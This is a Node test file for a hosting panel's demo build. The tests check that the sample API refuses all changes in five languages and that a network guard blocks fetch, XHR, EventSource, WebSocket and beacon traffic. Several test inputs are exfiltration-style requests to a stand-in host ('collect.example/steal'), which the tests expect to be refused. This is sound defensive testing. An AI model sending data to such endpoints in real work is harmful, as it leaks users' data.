// The demo build (#39): its API answers from sample data, refuses every
// change, and nothing the page can do reaches the network. Run under node as
// the files are (erasable TypeScript).
import { test } from 'node:test'
import assert from 'node:assert/strict'

import { createDemo } from '../demo/api.ts'
import { installDemo } from '../demo/install.ts'
import { LOCALES, MESSAGES, messagesFor } from '../demo/messages.ts'

const ORIGIN = 'https://demo.example'

function req(method, path, extra = {}) {
  const u = new URL(path, ORIGIN)
  return { method, path: u.pathname, query: u.searchParams, body: undefined, lang: 'en', ...extra }
}

test('the demo speaks the panel\'s five languages', () => {
  assert.deepEqual([...LOCALES].sort(), ['de', 'en', 'es', 'fr', 'it'])
  for (const code of LOCALES) {
    const m = MESSAGES[code]
    for (const key of ['banner', 'get', 'refused', 'missing']) assert.ok(typeof m[key] === 'string' && m[key].length > 8, `${code}.${key}`)
  }
  assert.equal(messagesFor('it-IT,it;q=0.9').refused, MESSAGES.it.refused)
  assert.equal(messagesFor('ja').refused, MESSAGES.en.refused)
  assert.equal(messagesFor(undefined).refused, MESSAGES.en.refused)
})

test('the sample API answers what the pages ask first', () => {
  const demo = createDemo({ now: Date.parse('2026-10-27T10:00:00Z') })
  const get = path => demo.handle(req('GET', path))
  assert.equal(get('/api/bootstrap').body.setup_complete, true)
  const session = get('/api/session').body
  assert.equal(session.user.role, 'admin')
  const sites = get('/api/sites').body
  assert.ok(sites.length >= 4 && sites.every(s => s.domain && s.status && s.config))
  assert.ok(sites.some(s => s.staging_of), 'a staging copy')
  for (const s of sites) {
    assert.equal(get(`/api/sites/${s.id}`).body.domain, s.domain)
    for (const sub of ['certificate', 'backups', 'cache-stats', 'usage?range=24h', 'logs?source=access', 'cron']) {
      assert.equal(get(`/api/sites/${s.id}/${sub}`).status, 200, `${s.domain} ${sub}`)
    }
  }
  assert.equal(get('/api/sites/999').status, 404)
  assert.equal(get('/api/system/status').body.cpu_count, 4)
  assert.equal(get('/api/system/metrics').body.length, 288)
  assert.equal(get('/api/sites/1/usage?range=30d').body.range, '30d')
  assert.equal(get('/api/sites/1/backups').body[0].verify_status, 'passed')
  // A page with no sample data says so, in the language asked.
  const missing = demo.handle(req('GET', '/api/sites/1/quarry/something', { lang: 'it' }))
  assert.equal(missing.status, 404)
  assert.equal(missing.body.error, MESSAGES.it.missing)
})

test('every change but this browser\'s own is refused, in the language asked', () => {
  const demo = createDemo()
  const writes = [
    ['POST', '/api/sites'], ['PATCH', '/api/sites/1'], ['DELETE', '/api/sites/1'], ['POST', '/api/sites/1/purge'], ['PUT', '/api/sites/1/maintenance'],
    ['POST', '/api/sites/1/backups'], ['PUT', '/api/settings'], ['POST', '/api/users'], ['DELETE', '/api/users/2'], ['POST', '/api/tokens'],
    ['POST', '/api/sites/1/files/upload'], ['PUT', '/api/sites/1/files'], ['POST', '/api/sites/1/database/query'], ['POST', '/api/system/update'],
    ['POST', '/api/firewall/rules'], ['POST', '/api/anything/at/all']
  ]
  for (const [method, path] of writes) {
    for (const lang of ['en', 'it', 'fr']) {
      const r = demo.handle(req(method, path, { lang, body: { x: 1 } }))
      assert.equal(r.status, 403, `${method} ${path}`)
      assert.equal(r.body.error, messagesFor(lang).refused)
      assert.equal(r.body.demo, true)
    }
  }
  // The sample data did not change.
  assert.equal(demo.handle(req('GET', '/api/sites')).body.length, 5)
  assert.equal(demo.handle(req('GET', '/api/sites/1')).body.config.cache_enabled, true)
  // What stays in the browser: the language, and signing in and out.
  assert.equal(demo.handle(req('PUT', '/api/account/profile', { body: { locale: 'de' } })).body.locale, 'de')
  assert.equal(demo.handle(req('GET', '/api/session')).body.user.locale, 'de')
  assert.equal(demo.handle(req('POST', '/api/logout')).status, 200)
  assert.equal(demo.handle(req('GET', '/api/session')).body.user, null)
  assert.equal(demo.handle(req('POST', '/api/login')).status, 200)
  assert.equal(demo.handle(req('GET', '/api/session')).body.user.email, 'demo@cloudground.it')
})

// A window as the page has it, with spies where the network would be.
function fakeWindow() {
  const calls = []
  const timers = []
  const win = {
    location: { origin: ORIGIN, href: `${ORIGIN}/demo/` },
    document: { documentElement: { lang: 'en' } },
    navigator: { language: 'en', sendBeacon: () => { throw new Error('the real sendBeacon') } },
    setTimeout: (fn) => { timers.push(fn); queueMicrotask(fn); return timers.length },
    fetch: () => { throw new Error('the page\'s own fetch is only reached through the guard\'s real') },
    XMLHttpRequest: function RealXHR() { throw new Error('the real XMLHttpRequest') },
    EventSource: function RealEventSource() { throw new Error('the real EventSource') },
    WebSocket: function RealWebSocket() { throw new Error('the real WebSocket') }
  }
  return { win, calls }
}

function install() {
  const { win, calls } = fakeWindow()
  // The page's own fetch, which the guard keeps for its files and wraps.
  const real = { fetch: (input, init) => { calls.push({ input: String(input?.url ?? input), method: (init?.method ?? input?.method ?? 'GET').toUpperCase() }); return Promise.resolve(new Response('real file')) } }
  installDemo(win, { real })
  return { win, calls }
}

test('fetch: /api is the demo\'s, the site\'s own files are read, nothing else is sent', async () => {
  const { win, calls } = install()
  const sites = await (await win.fetch('/api/sites')).json()
  assert.ok(Array.isArray(sites) && sites.length > 3)
  for (const method of ['POST', 'PUT', 'PATCH', 'DELETE']) {
    const r = await win.fetch('/api/sites/1/purge', { method, headers: { 'Accept-Language': 'fr', 'Content-Type': 'application/json' }, body: '{"urls":["/"]}' })
    assert.equal(r.status, 403, method)
    assert.equal((await r.json()).error, MESSAGES.fr.refused)
  }
  // A Request object is read the same way.
  const viaRequest = await win.fetch(new Request(`${ORIGIN}/api/sites/1`, { method: 'DELETE' }))
  assert.equal(viaRequest.status, 403)
  assert.equal(calls.length, 0, `the real fetch was called for the API: ${JSON.stringify(calls)}`)

  // The page's own files, read.
  assert.equal(await (await win.fetch('/demo/_nuxt/entry.js')).text(), 'real file')
  assert.deepEqual(calls, [{ input: '/demo/_nuxt/entry.js', method: 'GET' }])
  calls.length = 0

  // Everything else is refused before it is sent.
  const refused = [
    ['https://collect.example/steal', { method: 'POST', body: 'x' }],
    ['https://collect.example/steal', {}],
    ['//collect.example/steal', {}],
    [`${ORIGIN}/demo/save`, { method: 'POST', body: 'x' }],
    [`${ORIGIN}/demo/save`, { method: 'PUT', body: 'x' }],
    [`${ORIGIN}/demo/save`, { method: 'DELETE' }],
    ['/api', { method: 'POST' }],
    ['http://127.0.0.1:5252/api/sites', {}],
    ['data:text/plain,x', {}]
  ]
  for (const [url, init] of refused) {
    await assert.rejects(Promise.resolve().then(() => win.fetch(url, init)), TypeError, `${init.method ?? 'GET'} ${url}`)
  }
  assert.equal(calls.length, 0, `something was sent: ${JSON.stringify(calls)}`)
})

test('XMLHttpRequest: an upload is answered with the refusal and sent nowhere', async () => {
  const { win, calls } = install()
  for (const target of ['/api/sites/1/files/upload?path=x', 'https://collect.example/steal', '/demo/save']) {
    const x = new win.XMLHttpRequest()
    const done = new Promise(resolve => { x.onloadend = () => resolve() })
    x.open('POST', target)
    x.setRequestHeader('Content-Type', 'application/octet-stream')
    x.send(new Uint8Array([1, 2, 3]))
    await done
    assert.equal(x.status, 403, target)
    assert.equal(x.readyState, 4)
  }
  assert.equal(calls.length, 0)
})

test('EventSource opens the event stream and nothing else; no WebSocket, no beacon', async () => {
  const { win } = install()
  const es = new win.EventSource('/api/events?last_event_id=3')
  await new Promise(resolve => { es.onopen = resolve })
  assert.equal(es.readyState, 1)
  es.close()
  assert.equal(es.readyState, 2)
  for (const url of ['https://collect.example/events', '/api/other', '/events']) {
    assert.throws(() => new win.EventSource(url), TypeError, url)
  }
  assert.throws(() => new win.WebSocket('wss://collect.example/'), TypeError)
  assert.equal(win.navigator.sendBeacon('https://collect.example/', 'x'), false)
})
